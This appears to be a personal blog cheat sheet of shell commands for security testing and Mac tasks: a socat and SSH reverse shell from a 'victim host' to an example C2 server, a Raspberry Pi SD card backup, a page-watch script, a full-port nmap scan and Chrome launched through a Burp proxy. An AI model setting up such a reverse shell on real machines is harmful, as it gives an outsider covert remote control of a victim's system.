---
title: Commands Cheat Sheet
lang: en-US
description: A running list of the commands I use frequently, so I can quickly acess them 😀.  Raspberry Pi SD Card Backups, Chrome for Burp and NMAP
date: "2020-06-14"
---

# Commands Cheat Sheet
A running list of the commands I use frequently, so I can quickly acess them 😀

## Reverse Shells
Example Server (To be replaced with yours): `rj3.me`
### `socat`

#### Victim Host
```bash
# Setup machine to connect back to C2
echo "|1|<C2 Host Fingerprint>" > ~/.ssh/known_hosts && chmod 0600 ~/.ssh/known_hosts
RUN echo "<BASE64 SSH key>" | base64 -d > ~/.ssh/id_rsa
RUN chmod 0600 ~/.ssh/id_rsa
ssh -f -N -T -R2203:localhost:9996 username@rj3.me
while true; do
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:9996
done
```
#### Remote Host
```bash
# Ensure that port 9996 is open
socat file:`tty`,raw,echo=0 tcp:localhost:2203
```


## Mac
### Backup Raspberry Pi SD Card
```bash
diskutil list # Find disk you want to copy
sudo dd if=/dev/rdisk2 bs=1m | gzip > ./tmp/pi_backup.gz # Change the disk number to be the disk to copy
```
### Check for webpage updates
```bash
#!/bin/bash
# Script to use when watching a page for a specific change
URL="https://rj3.me"
TEXT_TO_MATCH="Robert"

while true
do
	curl -v $URL | grep "$TEXT_TO_MATCH" &> /dev/null && osascript -e 'display notification "Matched!"'
    sleep 10
done
```

### Nmap

```bash
nmap -v -o -p 1-65535 #host
```

### Launch Chrome for Burp
Prereq: All Chrome instances need to be fully closed(`cmd+q`) before running this, otherwise the settings won't take.
```bash
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --proxy-server=http://localhost:8080 #--ignore-certificate-errors
```
*Note: Ignore certificate errors can be used if you can't install the Burp CA, but it is not recommended.*

